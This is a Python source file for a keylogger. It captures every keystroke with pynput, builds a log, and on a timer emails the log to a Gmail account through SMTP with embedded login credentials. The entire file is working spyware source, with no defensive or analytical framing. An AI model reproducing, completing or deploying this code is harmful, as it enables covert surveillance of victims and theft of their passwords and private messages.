import smtplib

import threading

from pynput import keyboard

class Keylogger:

    def __init__(self,time_interval:int,email:str,password:str) -> None:

        self.interval=time_interval
        self.log="Keylogger started.."
        self.email=email
        self.password=password

    def append_to_log(self,string):
        assert isinstance(string,str)
        self.log=self.log+string

    def on_press(self,key):
        try:
            current_key=str(key.char)
        except AttributeError:
            if key==key.space:
                current_key=" "
            elif key==key.esc:
                print("existing....")
                return False
            else:
                current_key=" " + str(key) +" "
        self.append_to_log(current_key)
    
    # def screenshot(Self):
    #     x=10
        
    def send_mail(self,email,password,message):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    def message_sending(self):
        send_off=self.send_mail(self.email,self.password,"\n\n"+self.log)
        self.log=""
        timer=threading.Timer(self.interval,self.message_sending)
        timer.start()

    def start(self):
        keyboard_listener=keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.message_sending()
            keyboard_listener.join()
